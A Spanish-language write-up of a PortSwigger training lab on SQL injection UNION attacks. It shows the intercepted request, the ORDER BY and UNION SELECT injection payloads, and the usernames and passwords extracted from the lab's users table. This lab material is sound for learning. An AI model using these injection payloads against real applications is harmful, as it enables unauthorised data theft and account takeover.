# Write-up - PortSwigger SQLi Lab 4

Voy a hacer un laboratorio de Port Swigger. El lab 4 de SQLi (En esta url: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables) Descripción: Tradúcela al Español:
Lab: SQL injection UNION attack, retrieving data from other tables
 This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

Le damos a abrir lab y nos abre una página con la url: https://0a0f002d03318553802aa37c00ea00aa.web-security-academy.net/

La página web tiene el aspecto de la imagen 1. 

Una vez dentro, abrimos burpsuitepro y en el navegador activamos el FoxyProxy para que en el HTTP History vayan apareciendo las distintas Requests mientras navegamos por la página. Como ya nos da pistas la descripción del laboratorio, vamos a hacer el mismo de proceso de SQL injection UNION.

Para ello, nos vamos a la categoria de Tech+gifts => https://0a0f002d03318553802aa37c00ea00aa.web-security-academy.net/filter?category=Tech+gifts

Y desde burpsuite enviamos dicha petición al Repeater:
GET /filter?category=Tech+gifts HTTP/2
Host: 0a0f002d03318553802aa37c00ea00aa.web-security-academy.net
Cookie: session=SDcZvX3ArVTosKWss0m7Ro07d08khhZA
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

Y repetimos el mismo proceso de antes:
' ORDER BY 1--
HTTP/2 200 OK

' ORDER BY 2--
HTTP/2 200 OK

' ORDER BY 3--
HTTP/2 500 Internal Server Error

Tenemos por tanto 2 columnas en la tabla y está en coherencia con lo que vemos por pantalla:
Que es el nombre de un producto y una descripción.

Ahora vamos a verificar que columnas aceptan texto:
Para ello probamos a meter esta consulta en el parámetro de antes, y probamos en cada columna dejando el resto a NULL:
' UNION SELECT 'a',NULL--
HTTP/2 200 OK

SELECT NULL,'a'--
HTTP/2 200 OK

Ambos aceptan texto y vamos ahora a utilizar la pista del laboratorio para hacer la otra consulta y obtener la contraseña de administrador:
that retrieves all usernames and passwords, and use the information to log in as the administrator
user. 

Y efectivamente nos filtra dichos usuarios de esa tabla:
wiener
69nami1qfmbt7mybey4b

carlos
tjop7rbn0wcbaj7l2g7e

administrator
hch21lyqgsri8s0zrag3

Ahora nos vamos a loguear con administrator para completar el laboratorio. Nos vamos a login y ponemos las credenciales: (imagen 2)

Laboratorio completado (imagen 3)
